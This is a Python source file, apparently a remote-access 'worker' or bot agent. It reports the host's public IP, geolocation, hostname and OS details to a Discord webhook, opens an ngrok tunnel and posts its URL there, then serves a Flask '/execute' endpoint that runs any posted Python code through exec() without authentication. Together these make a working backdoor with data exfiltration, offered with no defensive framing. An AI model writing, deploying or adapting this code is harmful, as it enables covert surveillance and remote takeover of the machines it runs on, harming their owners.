from flask import Flask, request, jsonify
import json
import socket
import os
import platform
import requests
import subprocess
import time
from dhooks import Webhook
#worker v1
app = Flask(__name__)

if platform.system() == 'Linux':
    os.system("clear")
else:
    os.system("cls")
# Webhook URL for Discord
hook = Webhook("YOUR_DISCORD_WEBHOOK")

# Function to start ngrok and get the public URL
def start_ngrok():
    ngrok_process = subprocess.Popen(['ngrok', 'http', '8080'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print("waiting for ngrok to start..")
    time.sleep(10)  # Wait for ngrok to start

    # Get the public URL using ngrok's API
    try:
        response = requests.get('http://localhost:4040/api/tunnels')
        tunnels = response.json().get('tunnels', [])
        if tunnels:
            public_url = tunnels[0]['public_url']  # Get the first tunnel's public URL
            print("ngrok loaded succesfully!")
            time.sleep(3)
            print(f"Ngrok public URL: {public_url}")
            time.sleep(3)
            if platform.system() == 'Linux':
                os.system("clear")
            else:
                os.system("cls")
            print("loading flask..")
            time.sleep(3)
            print("flask loaded succesfully")
            time.sleep(1)
            if platform.system() == 'Linux':
                os.system("clear")
            else:
                os.system("cls")
            hook.send(f"```json\n{public_url}\n```")
            return public_url, ngrok_process
        else:
            print("No tunnels found.")
            ngrok_process.terminate()
            return None, ngrok_process
    except Exception as e:
        print(f"Error retrieving public URL: {e}")
        ngrok_process.terminate()
        return None, ngrok_process

# Function to gather system information
def gather_system_info():
    response = requests.get("http://ip-api.com/json/?fields=61439")
    ip_data = response.json()
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)

    public_ip = ip_data.get('query', 'N/A')
    ip_message = f"Public IP Info:\nPublic IP: {public_ip}\nCountry: {ip_data.get('country', 'N/A')}\nRegion: {ip_data.get('regionName', 'N/A')}\nCity: {ip_data.get('city', 'N/A')}\nISP: {ip_data.get('isp', 'N/A')}"
    
    system_data = platform.uname()
    system_info = {
        "Node": system_data.node,
        "System": system_data.system,
        "Machine": system_data.machine,
        "Release": system_data.release,
        "Version": system_data.version,
        "Local IP": local_ip
    }
    
    # Send gathered data to Discord
    worker = "worker_1_Python"
    hook.send(f"```json\n{worker}\n```")
    hook.send(f"```json\n{json.dumps(system_info, indent=4)}\n```")
    hook.send(f"```json\n{json.dumps(ip_data, indent=4)}\n```")
    return public_ip, ip_data, system_info

# Gather and send system information at startup
gather_system_info()


@app.route('/execute', methods=['POST'])
def execute():
    python_code = request.json.get('command')

    # Execute the Python code
    try:
        exec_globals = {}
        exec(python_code, exec_globals)
        result = "Executed successfully!"
    except Exception as e:
        result = f"Error: {e}"

    return jsonify({'result': result})

if __name__ == "__main__":
    public_url, ngrok_process = start_ngrok()  # Start ngrok and get the public URL
    if public_url:
        app.run(host='0.0.0.0', port=8080)  # Start Flask server

    # Cleanup
    ngrok_process.terminate()
